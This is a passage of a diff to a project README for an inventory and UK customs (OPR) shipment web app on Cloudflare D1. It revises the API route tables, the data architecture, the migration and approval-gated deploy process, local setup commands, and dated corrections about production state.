-| `GET`  | `/api/webhooks` | 🔒 | List this org's webhooks (secret never included) |
-| `POST` | `/api/webhooks` | 🔒 | Register a webhook. Body: `{url}`. Returns the signing secret **once**, at creation |
-| `POST` | `/api/webhooks/:id/toggle` | 🔒 | Body: `{enabled}`. Enable/disable delivery without deleting the config |
-| `DELETE` | `/api/webhooks/:id` | 🔒 | Remove a webhook |
-| `GET`  | `/api/opr/authorisations` | 🔒 | List OPR authorisations (org-scoped). The Saigates record is seeded via `seed.sql` |
-| `POST` | `/api/opr/authorisations` | 🔒 | Create an authorisation. Validated: EORI shape, ISO dates ordered, CDS number required (unique per org); CDS + CHIEF numbers stored as **distinct fields** |
-| `GET`/`PATCH` | `/api/opr/authorisations/:id` | 🔒 | Read / update an authorisation |
-| `GET`  | `/api/opr/shipments` | 🔒 | List shipments with line counts + total declared value |
-| `POST` | `/api/opr/shipments` | 🔒 | Create a DRAFT consignment. Enforced server-side: **GBP-only currency (`UKL` rejected)**, procedure codes (`2100`/`2200` export, `6121` import, **`2100+B51` forbidden**, `B51`/`B02` pair with `2200`), declaration charset (letters/numbers/spaces) on `reference`/`consignee_name`, mandatory org-scoped `authorisation_id` linkage |
-| `GET`/`PATCH` | `/api/opr/shipments/:id` | 🔒 | Detail (lines + authorisation + total) / edit header. **DRAFT-only**: non-DRAFT shipments are immutable (409) |
-| `POST` | `/api/opr/shipments/:id/lines` | 🔒 | Add a device: snapshots IMEI/SKU/attributes/`buy_price` **frozen at add time** (later device edits never leak into the declared line). Devices without `buy_price` rejected (422); one line per device per shipment (409). OPR 2: device must be `READY_FOR_EXPORT` and moves to `IN_EXPORT_CONSIGNMENT` in lockstep (event-logged) |
-| `POST` | `/api/opr/shipments/:id/scan` | 🔒 | **Consignment builder**: add a device by IMEI (scanner path). Same rules as `/lines` — `READY_FOR_EXPORT` gate, frozen snapshot, status lockstep |
-| `DELETE` | `/api/opr/shipments/:id/lines/:lineId` | 🔒 | Remove a line (DRAFT only); releases the device back to `READY_FOR_EXPORT` (event-logged) |
-| `GET` | `/api/opr/shipments/:id/validation` | 🔒 | **Green/amber/red validation engine** — 10 coded checks (currency, authorisation validity on ship date, procedure codes, commodity scope, IMEI Luhn/uniqueness, declaration text, unit values pence-exact, totals consistency, logistics). Red blocks finalisation; amber warns |
-| `GET` | `/api/opr/shipments/:id/invoice` | 🔒 | **Print-ready A4 commercial invoice** (HTML → browser print). Built from the frozen line snapshots; carries the CDS authorisation number (never the CHIEF one), procedure + commodity codes, OPR no-sale declaration |
-| `GET` | `/api/opr/shipments/:id/scan-out` | 🔒 | IMEI/value scan-out list — total equals the invoice total by construction (same pence-exact sum) |
-| `GET` | `/api/opr/shipments/:id/prealert` | 🔒 | Carrier customs **pre-alert email draft**. Mailbox + cut-off come from the authorisation record (`prealert_email`/`prealert_cutoff` — configurable data, seeded for FedEx); nothing is sent (OPR 4) |
-| `POST` | `/api/opr/shipments/:id/finalise` | 🔒 | **Finalisation**: blocked while validation has red results (422 + the failing checks, zero side-effects); locks lines/PATCH; every device → `EXPORTED_UNDER_OPR` through the state machine (event-logged); captures `export_mrn`/`ducr`/`ead_mrn` |
-| `POST` | `/api/opr/shipments/:id/export-proof` | 🔒 | Record/replace MRN / DUCR / EAD after finalisation — deliberately the **only** mutation a FINALISED export accepts. Export-direction only (409 on imports → use `/import-proof`) |
-| POST | `/api/opr/shipments/:id/prealert/mark-sent` | Record an operator's MANUAL pre-alert send (provider=manual/status=manual outbox row; server-built subject; optional validated `to` override) |
-| POST | `/api/opr/shipments/:id/clearance/mark-sent` | Record an operator's MANUAL clearance-instruction send (same honest manual row) |
-| `GET` | `/api/opr/shipments/:id/ce1154` | 🔒 | **C&E1154 duty-relief form** (OPR 3) — `?format=json` or print-ready A4 HTML. Quantity from the consignment, repair cost → GBP at the customs rate, exported-goods value = **frozen declared-at-export value of the returning devices only**, relief = duty on (goods+repair) minus duty on repair. The authorisation field carries the **CHIEF** number; the CDS number appears **only** in the cross-reference statement — a missing CHIEF number refuses (422) rather than substituting |
-| `GET` | `/api/opr/shipments/:id/clearance` | 🔒 | **Re-import clearance-instruction draft** (OPR 3): procedure 6121, quotes the original export MRN, duty/VAT on **repair cost only**. Nothing is sent (OPR 4) |
-| `GET` | `/api/opr/discharge` | 🔒 | **Discharge tracker** built from real shipment lines: per finalised export — exported vs returned vs outstanding device counts, deadline = export date + authorisation discharge period (day-clamped month maths), status open/closing/overdue/discharged + summary |
-| `POST` | `/api/opr/shipments/:id/finalise` (import) | 🔒 | **Receipt**: same endpoint, direction-aware. Red-blocked by the 10-check import validation engine (discharge-window overrun is amber, not red); captures `import_mrn`; every device → `RETURNED_UNDER_OPR` (event `IMPORT_RECEIVED` with the MRN) |
-| `POST` | `/api/opr/shipments/:id/import-proof` | 🔒 | Record/replace the 6121 import MRN on a FINALISED import |
-| `POST` | `/api/opr/shipments/:id/restock` | 🔒 | Explicit restock step: `RETURNED_UNDER_OPR` → `ACTIVE_INVENTORY` (event `RETURN_RESTOCKED`); idempotent — already-restocked devices are skipped, not errored |
-| `POST` | `/api/opr/shipments/:id/prealert/send` | 🔒 | **OPR 4: actually SENDS** the pre-alert via the Gmail REST API with the commercial invoice + scan-out attached. **Refuses 503 `gmail_not_configured`** (writing nothing) unless the `GMAIL_CLIENT_ID`/`GMAIL_CLIENT_SECRET`/`GMAIL_REFRESH_TOKEN` secrets are all set; refuses 422 if no `prealert_email` is configured (never invents a recipient). Every real attempt lands in the `sent_emails` outbox — success with the provider message id, or failure (502) with the provider error |
-| `POST` | `/api/opr/shipments/:id/clearance/send` | 🔒 | **OPR 4: SENDS** the clearance instruction (C&E1154 attached when computable) to `{ to }` from the body or the authorisation's pre-alert mailbox. Same honesty gate + outbox rules as pre-alert send |
-| `GET` | `/api/opr/shipments/:id/emails` | 🔒 | The `sent_emails` outbox for a shipment — an empty list genuinely means nothing was ever attempted |
-| `POST` | `/api/opr/shipments/:id/scan-bulk` | 🔒 | **OPR 4: bulk consignment builder** — `{ imeis: […] }` (≤200). Each IMEI goes through **exactly** the same direction-aware gates as single `/scan` with independent per-IMEI outcomes; a failed entry provably leaves zero side-effects and never blocks the rest |
-| `GET`  | `/api/print/queue` | 🔒 | Pending print jobs with payloads |
-| `GET`  | `/api/print/job/:id` | 🔒 | Single job |
-| `GET`  | `/api/print/settings` | 🔒 | Print settings (mode + whether PrintNode is configured) |
-| `POST` | `/api/print/settings` | 🔒 | Update settings. Body: `{print_mode?, printnode_api_key?, printnode_printer_id_large?, printnode_printer_id_small?}` (`null` clears) |
-| `GET`  | `/api/print/printnode/printers` | 🔒 | Proxy to PrintNode — list available printers for the configured account |
-| `GET`  | `/api/print/label/:id?size=large\|small&token=…` | 🔒 | Standalone HTML label page (`@page size` in real mm). Auto-fires `window.print()`. Opened via `window.open()`, so it accepts the token as a `?token=` query param (see **Authentication** above) |
-| `GET`  | `/api/print/labels?ids=1,2,3&size=…&token=…` | 🔒 | Bulk version with all labels separated by `page-break-after`. Same `?token=` fallback |
-| `POST` | `/api/print/send/:id?size=…` | 🔒 | Dispatch one label. Returns `{mode, url}` for browser mode, `{mode, printnode_job_id}` for PrintNode |
-| `POST` | `/api/print/send-all?size=…` | 🔒 | Bulk send / open one print window for all queued labels |
-| `POST` | `/api/print/mark-sent/:id` | 🔒 | Mark a single job as sent (used by the browser-print window) |
-| `POST` | `/api/print/mark-sent-batch` | 🔒 | Body: `{ids: [...]}`. Called by `postMessage` from the browser-print window after `afterprint` fires |
+| `/api/auth` | `routes/auth.ts` | mixed | `POST /login` 🔓, `POST /dev-login` 🔓 (410 tombstone), `POST /change-password`, `POST /doc-token` (mints a short-lived token for `?token=`-fallback pages), `GET /me` |
+| `/api/manifests` | `routes/manifests.ts` | 🔒 | ASN upload/list/detail/close/reopen/delete, `POST /:id/apply-sku-to-batch` (bulk SKU correction across a manifest's lines) |
+| `/api/scan` | `routes/scan.ts` | 🔒 | `POST /` (scan), `/confirm`, `/bulk`, `/force-add`, `/manual`, `/reject`, `GET /events/:manifestId` |
+| `/api/inventory` | `routes/inventory.ts` | 🔒 | List/delete, `POST /grade` (bulk grade override), `/sku-grade-consistency`, `/removal-flags` + `/removal-flags/:id/resolve`, `/grade-audit/:id`, `/stats` |
+| `/api/print` | `routes/print.ts` | 🔒 | Queue/job/settings, `GET /label/:id` + `/labels` (standalone print pages, `?token=` fallback), `POST /send/:id`, `/send-all`, `/mark-sent*`, `GET /printnode/printers` |
+| `/api/catalog` | `routes/catalog.ts` | 🔒 | `GET /`, `POST /upload` (bulk catalog CSV), `POST /lookup`, `POST /` (add SKU, self-heals missing grade-variant rows), `DELETE /:id` |
+| `/api/devices` | `routes/devices.ts` | 🔒 | `GET /` (filtered/paginated), `/:id`, `/repair-queue`, `/export/csv`, `/meta/statuses`; `PATCH /:id/correct` (SKU correction with optional manifest-line cascade); `POST /bulk-transition`, `/:id/transition`; `POST /:id/repair/{start,scan-back,qc,reopen,close-to-inventory,cost,cost-ledger}` 🔒🔒 for cost routes; `POST /:id/purchase/cost-ledger` 🔒🔒 |
+| `/api/webhooks` | `routes/webhooks.ts` | 🔒 | List/create/toggle/delete outbound webhook configs. Signed `X-Signature: sha256=<hmac>` on every delivery; fires after every successful device transition |
+| `/api/opr` | `routes/opr.ts` | 🔒 | 44 endpoints — see **OPR & Customs Domain** above. Authorisations, shipments (create/list/detail/edit), lines/scan (add/remove devices), validation, invoice, scan-out, prealert/clearance drafts + send + mark-sent, finalise + resume, export-proof/import-proof, restock, discharge, correspondence/replies/follow-up/checklist, value corrections + misdeclaration acks, ce1154, bulk builders |
+| `/api/bills` | `routes/bills.ts` | 🔒 | `GET /`, `/:id`, `POST /` (create), `/:id/close`, `/:id/force-close` 🔒🔒, `/:id/write-cost-ledger`, `/:id/repair-control` 🔒🔒 |
+| `/api/reports` | `routes/reports.ts` | 🔒🔒 | `GET /inventory-valuation` — see **Cost Model** above |
+| `/api/sku-map` | `routes/skuMap.ts` | 🔒🔒 | See **SKU Map & Zoho CSV Round-Trip** above |
+| `/api/zoho-sale-import` | `routes/zohoSaleImport.ts` | — | **NOT mounted in `src/index.tsx`** — imported but deliberately unmounted (its own request-level validation is not yet rebuilt; do not re-mount without separate authorisation). The underlying library (`applyZohoSaleImport()`) is built, tested, and used elsewhere. |
+
+`webhooks.ts` is correctly excluded from any "mounted routes sweep" since it has no distinct mount prefix issue — it's listed here for completeness.
 
 ## Data Architecture
 
 ### Storage
-- **Cloudflare D1** (SQLite). Local dev uses `--local` mode at `.wrangler/state/v3/d1`.
+**Cloudflare D1** (SQLite). Local dev uses `--local` mode at `.wrangler/state/v3/d1`. 41 migrations in `migrations/` (`0001`–`0040`); one file, `migrations-held/0030_expected_devices_condition_derived_from_grade.sql`, remains deliberately held pending renumbering (see `migrations-held/README.md`) — it is NOT one of the 41 applied.
 
-### Tables
-- `organisations` — tenants. One seeded row (`Default Organisation`, id `1`).
-- `users` — seeded operator/admin accounts, each tied to an `organisation_id`. No passwords yet (see **Authentication** above).
-- `manifests` — supplier ASN header (reference, supplier, status open/closed). Org-scoped.
-- `expected_devices` — one row per IMEI on the ASN, status `pending` → `received`. Org-scoped. Also carries **optional valuation hints** from the supplier file (`unit_cost` since 0001; `currency` + `vat_type` added in migration 0015) that pre-fill the confirm modal — hints only, never a substitute for the operator-confirmed valuation on `received_devices`.
-- `received_devices` — the core inventory record: UUID, SKU, source (`manifest` | `unreconciled`), lifecycle `status` (see **Device Status Lifecycle** above), valuation (`buy_price`, `currency`, `vat_type`, `supplier_id`), and `created_by_user_id` + `organisation_id` on every row.
-- `device_events` — **append-only** audit trail of every lifecycle mutation (`RECEIVE`, `STATUS_CHANGE`, `REJECT`) with `from_status`/`to_status`, `user_id`, `organisation_id`, optional `reference`/`metadata`. A device's `status` always equals its latest event's `to_status`.
-- `scan_events` — pre-existing audit trail of every raw scan *attempt* (matched, duplicate, unreconciled, rejected) — kept unchanged and written alongside `device_events`, which covers the device-mutation side specifically.
-- `sku_catalog` — reference catalog of clean SKUs. **Expanded 2026-07-29** (migration 0017): all `brand`/`model`/`color` values are now uppercase-normalized (matching had already been case-insensitive via `UPPER()` in `resolveCatalogSku()`, so this was a data-hygiene/UI-consistency fix, not a bug fix); legacy `GALAXY S22/S23 PLUS` rows were renamed to the canonical `GALAXY S22+`/`S23+` form and the 5 resulting exact duplicates removed (verified unreferenced elsewhere); 668 rows were added (all grades A/B/C/UG) for 14 latest-generation models — iPhone 17, 17 Pro, 17 Pro Max, Air, XR, SE and Galaxy S26, S26+, S26 Ultra, S25 FE, Z Fold6, Flip6, Fold7, Flip7. Production now holds **2,781 rows** (up from 2,118) — counted directly from `backups/prod_backup_2026-08-11_1707.sql`'s `sku_catalog` INSERT lines (2026-08-20 verification). **CORRECTION (2026-08-20): the "local dev mirrors this (2,783 rows)" claim that used to follow this sentence is deleted, not merely re-numbered — it was never true of this sandbox.** This local `--local` D1 has run on a plain migrate+seed dataset (migrations 0001–0029 plus `seed.sql`'s 14-row Samsung fixture) for at least the ten days spanned by `backups/d1-local-baseline-2026-08-10.sql`, which already shows the same total this check found today: 682 rows (`seed.sql`'s 14 + migration 0017's 668), never the production figure. Local dev catalog row count and production catalog row count are two different numbers that happen to both appear in this file; do not assume they track each other going forward without checking directly (`SELECT COUNT(*) FROM sku_catalog`) — this file's own prior wording is the reason that assumption went unchecked for as long as it did. **Also note (2026-08-20): 2,781 rows is not 2,781 configurations** — see the Catalog row-count vs. configuration-count distinction below.
+### Key tables (not exhaustive — see `migrations/*.sql` for full DDL)
+- `organisations`, `users` — tenancy + credentialed accounts.
+- `manifests`, `expected_devices` — supplier ASN header + per-IMEI lines (with optional valuation hints: `unit_cost`/`currency`/`vat_type`).
+- `received_devices` — the core inventory record: UUID, SKU, lifecycle `status` (14-value enum), valuation (`buy_price`/`currency`/`vat_type`/`supplier_id`), sale attribution columns (`sold_invoice_no`, `sold_date`, `sold_channel`, `sold_price_pence`, `attribution`, `vat_treatment`, `sold_shipment_id`), `received_at`.
+- `device_events` — append-only audit trail of every lifecycle mutation.
+- `scan_events` — raw scan-attempt log (matched/duplicate/unreconciled/rejected), separate from `device_events`.
+- `sku_catalog` — reference catalog, one row per `(model, capacity, color, grade)`. Self-heals missing grade-variant rows on ordinary receiving (see `POST /api/catalog`'s Decision 2).
+- `cost_ledger` — `purchase`/`repair`/`freight` cost rows per device; the basis for `acquisitionCost.ts`'s computed reads.
+- `shipments`, `shipment_lines` — OPR/temp-export consignments and their frozen device-line snapshots.
+- `opr_authorisations` — OPR Authorisation Number, EORI, CDS number, discharge period, pre-alert config.
+- `sent_emails` — outbox of every prealert/clearance send attempt (real or manual).
+- `sku_map` / `zoho_items` — internal-SKU ↔ Zoho-item-ID mapping.
+- `removal_flags` — written when a downgrade-to-UG regrade happens on `ACTIVE_INVENTORY` stock.
+- `print_jobs`, `webhooks`, `suppliers`, `repair_jobs`.
 
-  **Rows vs. configurations (2026-08-20, ahead of the G5 four-grade-variant sweep)**: `sku_catalog` stores one row per `(model, capacity, color, grade)` combination, not one row per `(model, capacity, color)` configuration — the four grades (A/B/C/UG) are separate rows sharing the same model/capacity/color. Confirmed directly against an isolated scratch D1 instance loaded with the same 2,781-row production export cited above (never the shared dev D1 — built via `wrangler d1 migrations apply --persist-to <scratch-dir>` then the export's `sku_catalog` INSERTs replayed on top, so this was a read-only, disposable check): 2,781 rows resolve to **702 distinct `(organisation_id, model, capacity, color)` configurations** — 693 of which already have all 4 grade variants (`693 × 4 = 2,772` rows) and 9 legacy pre-migration-0007 configurations (all Samsung, all from `seed.sql`) that hold only a single `UG` row each (`9 × 1 = 9` rows; `2,772 + 9 = 2,781` reconciles exactly). Any count of "configurations missing a variant" must be computed against the 702-configuration unit, not the 2,781-row unit — treating rows as configurations overstates a missing-variant count by roughly 4x.
-
-  **`sku_catalog` now grows through ordinary receiving, not only explicit catalog writes (noted 2026-08-21, corrects an assumption in `.deploy-checks/g5-item2-catalog-grade-gap-sweep.md`'s original "Decision 2 consequence" wording — see that file's dated addendum)**: `POST /api/catalog` self-heals a config that is missing some but not all of its four grade variants — any operator receiving an A/B/C-graded device against such a config inserts the remaining missing rows as a side effect of that single call (verified empirically, not just by re-reading the code; see the sweep doc's correction and the matching tracker entry). This is the **intended** behaviour per this route's Decision 2 design, but it means `sku_catalog` is no longer written to solely through deliberate catalog-management actions — an ordinary bench receive can now silently mint new catalogue rows. Anyone reconciling `sku_catalog`'s row count against a prior snapshot should expect organic growth from this path, not just from migrations or explicit `POST /api/catalog` calls made with catalog-maintenance intent.
-- `print_jobs` — queued/sent label print jobs with JSON payload.
-- `webhooks` — per-organisation outbound webhook config (`url`, `secret`, `enabled`).
-- `suppliers` — referenced by `received_devices.supplier_id` (optional FK, no CRUD UI yet — id-only for now).
-
-### Data flow
+### Data flow (high level)
 ```
-Supplier file ──► parseRows() (frontend)
-              ──► POST /api/manifests          ──► expected_devices (pending)
-HID scanner   ──► POST /api/scan               ──► scan_events
-              ──► POST /api/scan/confirm       ──► received_devices (status=RECEIVED) + print_jobs
-                                                  + device_events (RECEIVE) + expected_devices.status='received'
-              ──► POST /api/scan/force-add     ──► received_devices (source='unreconciled') + device_events (RECEIVE)
-Printer       ◄── POST /api/print/send/:id     ──► print_jobs.status='sent'
-                                                  + received_devices.label_printed_at
-Lifecycle     ──► POST /api/devices/:id/transition ──► received_devices.status + device_events (STATUS_CHANGE)
-                                                       ──► outbound webhook (if configured)
+Supplier file ─► POST /api/manifests          ─► expected_devices (pending)
+HID scanner   ─► POST /api/scan               ─► scan_events
+              ─► POST /api/scan/confirm       ─► received_devices (RECEIVED) + device_events + print_jobs
+Lifecycle     ─► POST /api/devices/:id/transition  OR  /repair/*  OR  opr.ts's /shipments/:id/{lines,scan,finalise,restock}
+                   ─► received_devices.status + device_events  ─► outbound webhook (if configured)
+Cost          ─► bills.ts close / manual cost-entry  ─► cost_ledger  ─► acquisitionCost.ts reads (computed, not stored)
+Sale          ─► Zoho export CSV ─► applyZohoSaleImport() ─► received_devices.sold_* + status→SOLD
 ```
 
-## User Guide
+## Migration & Deploy Process
 
-### Receive a new shipment
-1. Open the app, go to **Manifests** → **Upload Manifest**.
-2. Drag the supplier's `.xlsx` (e.g. the provided `YH001-Saigates Limited_260608.xlsx`) into the drop zone.
-3. Fill in reference + supplier (the filename pre-fills both) and **Create Manifest**.
-4. App jumps to the **Receive** view with the scan input focused.
-5. Start scanning. Each successful scan opens the SKU-confirm modal — most fields are pre-filled. Choose **Confirm only** (receive without a print label) or **Confirm & Print** (receive and queue a label) — printing is optional per device (added 2026-07-28 per owner request).
-6. If an off-manifest IMEI is scanned the screen flashes red — either **Reject** or **Force-add** with notes.
-7. As you scan, the right pane ticks devices over from pending → received, and the print queue fills with labels.
-8. When done, go to **Print Queue** and click **Send all** (in production this fires the labels to your DYMO LabelWriter via PrintNode or QZ Tray).
-9. Browse the finished stock in **Inventory** — no grade is set, so the devices are visible to operations but not to sales platforms.
+**Migrations**: `migrations/0001`–`0040` (41 files), applied in order by `gsk hosted deploy` itself — there is no separate migrate subcommand for this project category; one deploy action applies every not-yet-recorded migration file as a batch (D1's HTTP API has no atomic multi-statement DDL across files — each runs as an independent auto-commit statement, so a partial-apply is visible via the deploy result's `statement_index`/`remaining_statements` fields, not silently swallowed). `migrations-held/0030_...sql` stays physically outside `migrations/` until it's renumbered ahead of whatever now sits past it.
 
-### Keyboard
-- `Esc` while in Receive → refocus the scan input.
-- Inside the SKU-confirm modal: two footer buttons — **Confirm only** (no label) / **Confirm & Print** (queues a label). The old “Auto-queue print label” checkbox was replaced by this explicit choice.
+**Deploy path (current)**: Genspark-hosted Cloudflare via `gsk hosted deploy` (Workers for Platform, approval-gated — every deploy/rebuild/worker-delete action requires the operator's own typed confirmation naming the specific pending-action ID, never self-approved). The deploying session's own checked-out commit + its own fresh build are what ships — there is no server-side git-ref resolution for this project category.
 
-### A/B/C-graded device on 9 specific Samsung models — nothing extra to do
-A 2026-08-11 catalogue sweep found 9 Samsung configurations (GALAXY S20 FE/128GB/Cloud Navy, S21/256GB/Phantom Gray, S23 FE/256GB/Graphite, S24/256GB and 512GB/Phantom Black, S24 FE/256GB/Graphite, Z FLIP5/256GB and 512GB/Graphite, Z FOLD5/256GB/Phantom Black) that only had a UG catalogue row — no A/B/C rows yet existed for them. **This is not something bench staff need to work around**: if you scan a device on one of these models graded A, B, or C, the screen will show the usual red no-match banner exactly like any brand-new configuration — click **Add to catalogue & receive** as normal. That single click creates the missing row for the grade you're receiving *and* the other missing grade rows for that same model/capacity/color in the same action, so the very next device on that model in a different grade will match immediately without needing this step again. Receiving a UG-graded device on these models was never affected — it already matches the existing catalogue row via the normal scan path.
-
-If you ever see an error toast when adding one of these to the catalogue instead of it just working, that's a genuine issue (a SKU string collision, not the missing-row case above) — stop and flag it rather than retrying repeatedly.
-
-## Production Integration Notes
-
-### Connecting a physical DYMO LabelWriter
-
-**Option 1 — Browser Print (default, easiest):**
-1. Install the official DYMO LabelWriter driver on the workstation running the browser.
-2. Plug in the DYMO LW550 / LW450 / LW4XL etc. — make sure it appears in your OS Printers panel.
-3. Load the correct label stock (50×30 mm or 32×57 mm) and select the matching size in the top bar.
-4. Allow pop-ups for this site so the print window can open.
-5. Click `Send` — the system print dialog appears. Select the DYMO printer, set **Margins: None** and **Scale: 100%**, click Print.
-6. The print window posts back to `/api/print/mark-sent-batch` automatically once `afterprint` fires.
-
-**Option 2 — PrintNode (cloud, unattended):**
-1. Create a PrintNode account at <https://www.printnode.com/>.
-2. Install the PrintNode agent on the warehouse PC connected to the DYMO printer.
-3. Power on the printer; confirm it appears in the PrintNode dashboard.
-4. In the app go to **Settings** → switch mode to **PrintNode** → paste your API key → save.
-5. Click **Load printers** and map the DYMO 50×30 and DYMO 32×57 stations to specific PrintNode printer IDs.
-6. Now `Send` calls the PrintNode REST API server-side (`pdf_uri` pointing back at `/api/print/label/:id`) and the agent feeds the label to the printer with zero operator interaction.
-
-**Option 3 — Manual / Off:** Use during testing or if you print via some external workflow. `Send` only flips the DB flag.
-
-### Other production concerns
-- **Authentication**: implemented — real per-person credentialed login (PBKDF2-SHA256, two Saigates Limited accounts) issuing an HS256 JWT via `hono/jwt`; every `/api/*` route requires it except `/api/health`, `/api/auth/login`, and the dev-login **410 tombstone** (see **Authentication & Multi-Tenancy** above). The email-only dev-login was removed 2026-07-28 and provably cannot mint a token. An external IdP / SSO / Cloudflare Access remains a deliberate non-goal for the current two-person internal use case — wiring one later only touches `src/routes/auth.ts` / `src/lib/auth.ts` since routes only consume the verified `c.var.user`.
-- **Multi-tenant**: implemented — every domain table carries `organisation_id`, every write records it plus `user_id` from the verified token, every read is scoped with `WHERE organisation_id = ?`.
-- **Token-in-URL for print windows**: the `window.open()` label pages fall back to `?token=` because a plain navigation can't send an `Authorization` header. Flagged as a known limitation — revisit (e.g. a short-lived single-use print token, or a signed-URL scheme) before hardening auth further for production.
-- **PrintNode key storage**: stored server-side in the `app_settings` D1 table. The `GET /api/print/settings` endpoint only returns whether the key is configured — never the raw value.
-- **Webhook secret storage**: stored server-side in the `webhooks` table, returned to the caller **once**, at creation time (`POST /api/webhooks`), never echoed back by `GET /api/webhooks` afterwards.
-
-## Deployment
-
-> ✅ **DEPLOYED 2026-08-21, 16:11 UTC.** The ten-file migration batch
-> (`0023a`, `0023b`, `0023c`, `0024`–`0029`, `0031`) that this warning
-> used to describe as "ships on the next deploy, for any reason" has now
-> shipped, as one deploy action, with explicit user go-ahead. Production
-> `d1_migrations` carries all 32 rows (22 prior + these 10, ids 23–32,
-> `applied_at` 2026-08-21 16:11:44–47) in the exact expected order —
-> `0023a` → `0023b` → `0023c` → `0024`–`0029` → `0031` last. Direct
-> post-deploy checks (no leftover `_old`/`_new` scaffold tables; zero
-> orphaned `shipment_lines` rows against either recreated parent) found
-> no partial-migration defects. Only `migrations-held/0030_...sql`
-> remains withheld now — it needs renumbering (since `0031` has shipped
-> and now sits ahead of it) before it can be restored and deployed; see
-> `migrations-held/README.md`. Full deploy record, including the
-> pre-deploy build-hash gate and the smoke check, is in
-> `.deploy-checks/g5-phase2-live-half.md`'s "DEPLOYED" section.
->
-> **Decision that led here (2026-08-21): ship as one batch, not staged.**
-> Staging via `migrations-held/` was considered and rejected before this
-> deploy — the deploy applies migrations and ships code in one action,
-> so there was no "migrations first, code after" available, and `main`
-> at the time could not run against pre-`0023` schema (`src/types.ts`'s
-> `shipment_type` union and `received_at`/`RemovalFlag` fields,
-> `src/lib/deviceLifecycle.ts`'s `TEMP_EXPORTED_STANDARD` flow, all
-> depended on it directly). Splitting at the `0023a`/`0023b` boundary
-> specifically would have manufactured a half-migrated
-> `shipment_lines`-points-at-`shipments_old` state under live traffic
-> for a full deploy cycle — worse than the non-atomic-DDL risk it would
-> have been avoiding, not safer. See "Decision: ship the ten as one
-> batch, not staged" in `.deploy-checks/g5-phase2-live-half.md` for the
-> full verification that was done before this deploy was authorised.
-
-- **Platform**: Cloudflare Pages + Workers
-- **Status**: ✅ Running in sandbox (port 3000 via Wrangler)
-- **Tech Stack**: Hono · TypeScript · Cloudflare D1 · vanilla JS SPA · Tailwind CDN
-- **Last Updated**: 2026-07-29 — `sku_catalog` uppercase-normalized + expanded with 14 latest Apple/Samsung models (668 new rows; production 2,118 → 2,781 rows; migration 0017, applied directly to prod/local D1 and captured in the migration file for future fresh-environment sync). Previously 2026-07-28 (OPR 6) (OPR 5 frontend UI — full OPR tab in the SPA, browser-proven by 30 Playwright checks; identifier rule tightened to strict 15-digit IMEI + Luhn / 10-character alphanumeric serial; previously OPR 1–4 API-level, JWT auth + multi-tenancy, device status lifecycle + `device_events` audit log, valuation fields, server-side authoritative validation, `/api/devices` read+CSV-export API, outbound signed webhooks)
-
-  > **CORRECTION (2026-09-08)**: the date above went stale without being updated — this line stopped being touched after the `0017` catalog pass even though many deploys have shipped since (`.deploy-checks/` alone has dated records through 2026-09-08, including the H0 fix deploy on 2026-09-07 and the CSV-export deploy today). Rather than re-date this line again to a value that will just as quietly go stale, treat **git log on `main`** and **`.deploy-checks/*.md`** as the live sources of truth for "what changed when"; this front-matter line is kept only as a historical record of the last time it was hand-maintained.
-
-### Local dev
 ```bash
+# Local dev
 npm install
-npm run db:migrate:local         # create local SQLite
-npm run db:seed                  # seed SKU catalog + default org/users
-echo "JWT_SECRET=dev-local-insecure-secret-change-me" >> .dev.vars   # required — server 500s without it
+npm run db:migrate:local
+npm run db:seed
+echo "JWT_SECRET=dev-local-insecure-secret-change-me" >> .dev.vars
 npm run build
-pm2 start ecosystem.config.cjs   # serves on http://localhost:3000
-```
-Then provision a local password (`node scripts/set-password.mjs owner@saigates.com <pw>` prints a hash-only `UPDATE` — run it with `npx wrangler d1 execute webapp-production --local --command="..."`), and get a token: `curl -X POST http://localhost:3000/api/auth/login -d '{"email":"owner@saigates.com","password":"<pw>"}' -H 'Content-Type: application/json'`. Use it as `Authorization: Bearer <token>` on every other `/api/*` call (the SPA does this automatically once you sign in through the UI).
+pm2 start ecosystem.config.cjs   # http://localhost:3000
 
-### Production deploy (Genspark-hosted Cloudflare — current path)
-**Last deployed 2026-08-21, 16:11 UTC** via `gsk hosted deploy` (Workers for Platform
-on a Genspark-managed Cloudflare account, approval-gated), `Current Version ID:
-7bac1f76-fb7e-4e71-b73d-6b3b8d43990f`. Managed resources: worker + D1
-`d6aea290-bd61-4f82-aa8d-94378b9f2fec-db` (**32 of 32 migrations in `migrations/`
-applied** — `0001`–`0029` plus `0031`; only `0030` remains held, see the warning
-above; SKU seed loaded); `JWT_SECRET` set as a write-only worker secret
-(`gsk hosted secret_put`). Production is **level with `main`** as of this deploy
-(commit `f6de852`) — the CSV-export fixes, the credentialed-login pass (migration
-0016), and the ten-file OPR/repair/catalog batch above are all live. Full
-verification record: `.deploy-checks/g5-phase2-live-half.md`'s "DEPLOYED" section.
-
-> **CORRECTION (2026-09-08)**: `f6de852` is now stale by 28 commits — production has
-> moved on since this paragraph was written and was NOT re-checked at each
-> subsequent deploy. Verified this pass by app.js hash-match (curl production's
-> live `/static/app.js`, sha256, match against `git show <commit>:public/static/app.js`
-> for candidate commits): the live asset is byte-identical to `aae5b1f` ("B3/B4:
-> CSV export column-set correction...", 2026-09-08), which is 28 commits ahead of
-> `f6de852` and itself an ancestor of a later deploy recorded in
-> `.deploy-checks/pre-0029-export.md` (`89fb02b`, deployed 2026-09-07, version
-> `f5707718-45bc-4ab2-9c5f-8f4e824e5203`) and of `.deploy-checks/csv-export-deploy-2026-09-08.md`
-> (today's deploy, built from `aae5b1f`). The user-cited comparison hash `6a9810a4`
-> does not exist as a git object in this repo (`git cat-file -t 6a9810a4` → "fatal:
-> Not a valid object name") — flagging as unresolved/possibly a typo or truncation
-> rather than guessing at intent. Treat `f6de852` throughout this file as a
-> historical marker, not a current fact; re-derive the live commit via the
-> hash-match method above before relying on any "production is on commit X" claim.
-
-> ⚠️ **Two environments, and until 2026-07-28 they had DIFFERENT passwords.** The
-> production Worker and the local sandbox preview (`localhost:3000` / the in-chat
-> Preview panel) are backed by **two separate D1 databases**, each with its own
-> independently provisioned `password_hash`. A password that works on one returned a
-> perfectly truthful `Invalid email or password` on the other — which, to the person
-> typing it, is indistinguishable from a broken deploy. That exact confusion happened.
-> **Both databases are now provisioned with the same hashes**, and
-> `test/browser/login-prod.browser.mjs` is run against **both URLs** so the
-> divergence cannot recur unnoticed. When handing over credentials, always name the
-> URL they belong to.
-
-**Credentialed login is live in production.** Both per-person accounts
-(`owner@saigates.com`, `ops@saigates.com`) have real PBKDF2 hashes and were verified
-by logging in against the live instance; the legacy `admin@goodsin.local` row is
